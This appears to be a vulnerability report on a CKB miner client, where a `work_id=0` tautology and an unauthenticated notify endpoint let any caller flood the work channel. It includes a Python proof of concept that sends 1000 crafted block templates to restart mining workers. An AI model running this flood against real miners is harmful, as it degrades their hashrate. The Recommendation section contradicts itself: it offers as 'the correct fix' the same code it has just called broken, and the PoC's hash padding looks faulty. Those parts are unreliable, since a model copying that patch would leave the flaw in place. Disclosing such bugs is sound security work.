### Title
`work_id=0` Tautology Bypass in `update_block_template` Floods Miner Work Channel — (`miner/src/client.rs`)

### Summary

A logic error in `Client::update_block_template` makes the deduplication guard a tautology when `work_id = 0`. Any process that can POST to the miner's unauthenticated notify HTTP endpoint can send repeated `BlockTemplate` payloads with `work_id=0`, causing the miner to continuously dispatch redundant work units, restart mining workers, and issue stale `submit_block` RPC calls, degrading effective hashrate.

---

### Finding Description

The deduplication guard in `update_block_template` is:

```rust
let updated = |id| {
    if id != work_id || id == 0 {
        Some(work_id)
    } else {
        None
    }
};
``` [1](#0-0) 

When `work_id = 0`, the condition `id != 0 || id == 0` is a tautology — it is `true` for every possible value of `id`. `fetch_update` therefore always succeeds, and `Works::New` is unconditionally sent to the channel on every call. [2](#0-1) 

The notify HTTP endpoint that feeds this function has no authentication:

```rust
async fn handle(client: Client, req: Request<hyper::body::Incoming>) -> ... {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }
    Ok(Response::new(Empty::new()))
}
``` [3](#0-2) 

The work channel is created as `unbounded()`, so there is no backpressure to slow the flood. [4](#0-3) 

---

### Impact Explanation

Each `Works::New` message received by the miner's main loop calls `notify_new_work`, which sends `WorkerMessage::NewWork` to all worker threads, interrupting their current nonce search. [5](#0-4) 

There is a secondary check via `legacy_work` (an LRU cache of submitted parent hashes), but it only skips the restart if the parent hash was previously submitted — a fresh attack with any unseen parent hash bypasses it entirely. [6](#0-5) 

The attacker can trivially vary the `parent_hash` field in each crafted `BlockTemplate` to ensure `legacy_work` never matches, forcing a worker restart on every POST. The result is:
- Mining workers are continuously interrupted and restarted, reducing effective hashrate toward zero.
- The unbounded channel accumulates queued work units, growing memory usage.
- Each nonce found against a stale template triggers a `submit_block` RPC call that the node will reject.

---

### Likelihood Explanation

The notify mode is an opt-in production feature documented in the miner config (`listen: Option<SocketAddr>`). [7](#0-6) 

When configured (e.g., `listen = "0.0.0.0:PORT"` or even `127.0.0.1:PORT`), the endpoint is reachable by any process on the host or network with no credential requirement. The `work_id` field in `BlockTemplate` is attacker-controlled JSON with no server-side validation at the notify handler. The attack requires only the ability to send HTTP POST requests to the configured address.

---

### Recommendation

Fix the tautology by separating the two intended cases:

```rust
// Intended: update if new work arrived OR if current_work_id is still at initial 0
let updated = |id: u64| {
    if id == 0 || id != work_id {
        Some(work_id)
    } else {
        None
    }
};
```

This still has the same tautology. The correct fix is to treat `work_id=0` as a sentinel only for `current_work_id`, not for the incoming template:

```rust
let updated = |id: u64| {
    // Accept if: we have no work yet (id==0) OR the incoming work is genuinely new
    if id == 0 || id != work_id {
        Some(work_id)
    } else {
        None
    }
};
```

The real fix is to ensure `work_id=0` from an incoming template is **not** treated as always-new. One approach: reject or remap incoming `work_id=0` templates, or change the initial sentinel to `u64::MAX` so it cannot collide with a valid `work_id`. Additionally, add authentication (e.g., a shared secret or bind-only-to-localhost enforcement) to the notify HTTP endpoint.

---

### Proof of Concept

```python
import requests, json

# Minimal valid BlockTemplate JSON with work_id=0
template = {
    "version": "0x0", "compact_target": "0x1a08a97e",
    "current_time": "0x174b3e5f000", "number": "0x1",
    "epoch": "0x708200000000", "parent_hash": "0xdeadbeef" + "00"*28,
    "cycles_limit": "0x2540be400", "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2", "uncles": [], "transactions": [],
    "proposals": [], "cellbase": {"hash":"0x"+"00"*32,"cycles":None,
        "min_fee_rate":"0x0","time_added_to_pool":None,
        "data":{"cell_deps":[],"header_deps":[],"inputs":[],"outputs":[],"outputs_data":[],"version":"0x0","witnesses":[]}},
    "work_id": "0x0",   # <-- always bypasses the guard
    "dao": "0x"+"00"*32
}

for i in range(1000):
    # vary parent_hash to bypass legacy_work check
    template["parent_hash"] = hex(i).replace("0x","0x"+"0"*(64 - len(hex(i))+2))
    requests.post("http://127.0.0.1:NOTIFY_PORT", json=template)
# Assert: miner work channel receives 1000 messages, workers restarted 1000 times
```

Each iteration passes the `id != 0 || id == 0` guard unconditionally, sends `Works::New`, and (with a distinct `parent_hash`) triggers a full worker restart.

### Citations

**File:** miner/src/client.rs (L295-301)
```rust
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
```

**File:** miner/src/client.rs (L302-311)
```rust
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** ckb-bin/src/subcommand/miner.rs (L12-12)
```rust
    let (new_work_tx, new_work_rx) = unbounded();
```

**File:** miner/src/miner.rs (L127-138)
```rust
    fn notify_new_work(&mut self, work: Work) {
        let parent_hash = work.block.header().into_view().parent_hash();
        if !self.legacy_work.contains(&parent_hash) {
            let pow_hash = work.block.header().calc_pow_hash();
            let (target, _) = compact_to_target(work.block.header().raw().compact_target().into());
            self.notify_workers(WorkerMessage::NewWork {
                pow_hash,
                work,
                target,
            });
        }
    }
```

**File:** util/app-config/src/configs/miner.rs (L29-29)
```rust
    pub listen: Option<SocketAddr>,
```
